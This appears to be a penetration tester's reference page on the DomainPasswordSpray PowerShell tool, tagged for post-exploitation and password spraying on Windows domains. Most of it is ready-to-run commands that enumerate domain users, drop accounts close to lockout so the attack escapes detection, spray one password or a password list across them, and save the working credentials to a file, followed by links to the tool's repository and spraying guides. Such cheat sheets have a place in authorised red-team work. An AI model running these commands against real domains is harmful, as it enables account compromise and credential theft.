---
author(s):
  - Userware
tags:
  - post-exploitation
  - privilege-escalation
  - password-cracking
  - password-spraying
  - bring-your-own-land
  - windows
---
# Scripts

## DomainPasswordSpray

Perform automated user enumeration then password spray process when executing from the current domain.

```
PS C:\> Invoke-DomainPasswordSpray -Password <password> -OutFile credentials.txt
```

Specifying a password list then check for [[07 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Host/0xA - Internal Reconnaissance/Users/Manual/Living off the Land|account lockout observation window]].

```
PS C:\> Invoke-DomainPasswordSpray -PasswordList passwords.lst -OutFile credentials.txt
```

You can output the user accounts without lockouts.

```
PS C:\> Get-DomainUserList -Domain <DOMAIN> -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ASCII users.lst

PS C:\> Invoke-DomainPasswordSpray -Domain <DOMAIN> -UserList users.lst -Password <password> -OutFile credentials.txt
```

---
## References

### Source Repositories

- [dafthack: DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

### Pwnage Base

- [Pwnage Base: Password Spray](https://pwn.no0.be/exploitation/password/smb/)

### Hacking Articles

- [Hacking Articles: Comprehensive Guide on Password Spraying Attack](https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/)